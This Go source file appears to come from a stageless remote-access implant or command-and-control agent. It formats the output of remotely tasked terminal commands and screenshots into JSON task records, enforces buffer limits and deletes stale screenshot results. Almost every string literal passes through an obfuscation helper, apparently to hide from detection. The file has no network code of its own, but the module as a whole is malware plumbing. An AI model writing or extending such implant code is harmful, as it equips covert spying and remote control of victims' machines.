package tasks

import (
	"encoding/json"
	"strings"

	"stageless/utils/general"
	"stageless/utils/obf"
)

const (
	TasksBufferMax      = uint64(700) * 1024 * 1024
	TaskBufferFloor     = 4096
	ThreadBufferContent = 32 * 1024 * 1024
)

// TaskOutputFromBytes keeps only command output that fits the worker buffer (same as Linux thread buf).
func TaskOutputFromBytes(out []byte) (raw string, ok bool) {
	if out == nil {
		return "", false
	}
	n := len(out)
	if n > ThreadBufferContent {
		return "", false
	}
	return string(out[:n]), true
}

func createJSON(work TaskRecord, raw string, failed bool) string {
	// Builds the JSON result for a finished task
	if work.CmdType == obf.S("terminal") {
		out := raw
		if failed {
			if len(raw) > 0 {
				out = raw
			} else {
				out = obf.S("Command failed")
			}
		}
		shell := general.MarshalJSON(map[string]any{
			obf.S("option"):   obf.S("output"),
			obf.S("type"):     obf.S("terminal"),
			obf.S("task_tag"): work.Tag,
			obf.S("output"):   "",
		})
		maxOut := int(TasksBufferMax) - len(shell)
		if maxOut > 0 && len(out) > maxOut {
			out = obf.S("Output is too big (>=32 MB)")
		} else if maxOut <= 0 {
			out = obf.S("Output is too big (>=32 MB)")
		}
		return general.MarshalJSON(map[string]any{
			obf.S("option"):   obf.S("output"),
			obf.S("type"):     obf.S("terminal"),
			obf.S("task_tag"): work.Tag,
			obf.S("output"):   out,
		})
	}
	if failed {
		errMsg := obf.S("Command failed")
		if len(raw) > 0 {
			errMsg = raw
		}
		return general.MarshalJSON(map[string]any{
			obf.S("option"):   obf.S("output"),
			obf.S("type"):     work.CmdType,
			obf.S("host"):     work.Host,
			obf.S("task_tag"): work.Tag,
			obf.S("error"):    errMsg,
		})
	}
	return raw
}

func ApplyTaskOutput(body string, params string, taskTag string) uint32 {
	// Stores a finished output as a pending task
	tag := taskTag
	// Só faz parse do JSON para extrair task_tag se o body cabe no limite; acima disso evita Unmarshal gigante.
	if tag == "" && uint64(len(body)) <= TasksBufferMax {
		var j map[string]any
		if err := json.Unmarshal([]byte(body), &j); err == nil {
			if v, ok := j[obf.S("task_tag")].(string); ok {
				tag = v
			}
		}
	}
	if body == "" {
		return 0
	}
	if strings.Contains(body, obf.S("\"type\":\"screenshot\"")) {
		taskMu.Lock()
		order := append([]uint32{}, taskOrder...)
		taskMu.Unlock()
		var drop []uint32
		for _, id := range order {
			ok, t := readTask(id, "")
			if ok && strings.Contains(t.Result, obf.S("\"type\":\"screenshot\"")) {
				drop = append(drop, id)
			}
		}
		for _, id := range drop {
			DeleteTask(id)
		}
	}
	if params == "" {
		params = obf.S("{}")
	}
	return createTask(TaskRecord{
		Tag:        tag,
		CmdType:    obf.S("output"),
		Params:     params,
		Result:     body,
		Done:       true,
		PendingOut: true,
	})
}
